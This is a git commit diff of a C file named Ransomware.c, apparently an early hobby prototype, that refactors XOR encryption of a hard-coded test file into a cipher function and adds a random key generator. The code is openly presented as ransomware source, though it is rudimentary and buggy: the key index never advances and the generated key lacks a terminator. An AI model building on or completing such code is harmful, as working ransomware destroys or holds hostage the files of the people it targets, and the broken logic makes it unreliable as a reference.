69dae0ee7dbf7f560816569be6db444bb273b60d
Henrique Campiotti <henrique260699@hotmail.com>
2018-10-25 14:01:17 -0300

    Update
    + gerador  de chave

--- Ransomware.c
+++ Ransomware.c
@@ -2,43 +2,74 @@
 #include <string.h>
 #include <windows.h>
 #include <dirent.h>
+#include <time.h>
 
-int getSize(FILE *file);
+#define T 35
+
+	int getSize(FILE *file);
+	int cipher(BYTE *fileData, int fileSize, char *key);
+	char *generateKey(int stringLen);
 
 int main()
 {
 
 	FILE *file;
-	BYTE key[] = {"&HVGAnsm3|5dks90ja0hsd978&&çlakd"};
+
+	char *key =  generateKey(T);;
+
 	char fileName[] = {"teste.txt"};
-	char newFileName[] = {"t3st3.txt"};
 	int fileSize;
 	BYTE *fileData;
-	int i, j = 0;
+
+	printf("KEY>>%s\n", key);
 
 		file = fopen(fileName, "rb");
 
 		fileSize = getSize(file);
 
 		fileData = (BYTE *)malloc((fileSize+1)*sizeof(BYTE));
+
 		fread(fileData, fileSize, 1, file);
 
 		fclose(file);
 
-		file = fopen(newFileName, "wb");
+		cipher(fileData, fileSize, key);
 
-		for (i = 0; i < fileSize; ++i){
-			fileData[i] = fileData[i] ^ key[j];
-			if (j == strlen(key)){ j = 0; }
-		}
-
-		fwrite(fileData, 1, fileSize, file);
-
-		free(fileData);
-		fclose(file);
 	return 0;
 }
 
+int cipher(BYTE *fileData, int fileSize, char *key)
+{
+	int i, j = 0;
+	char newFileName[] = {"t3st3.txt"};
+
+	FILE *file = fopen(newFileName, "wb");
+
+	for (i = 0; i < fileSize; ++i){
+		fileData[i] = fileData[i] ^ key[j];
+		if (j == strlen(key)){ j = 0; }
+	}
+
+	fwrite(fileData, 1, fileSize, file);
+
+	free(fileData);
+	fclose(file);
+	
+	return 0;
+}
+
+char *generateKey(int stringLen)
+{	
+	int i;
+	char *key = malloc(stringLen + 1);
+	srand(time(NULL));
+
+	for (i = 0; i < stringLen; ++i){
+		key[i] = 32 + rand()%223;
+	}
+
+	return key;
+}
 
 int getSize(FILE *file)
 {
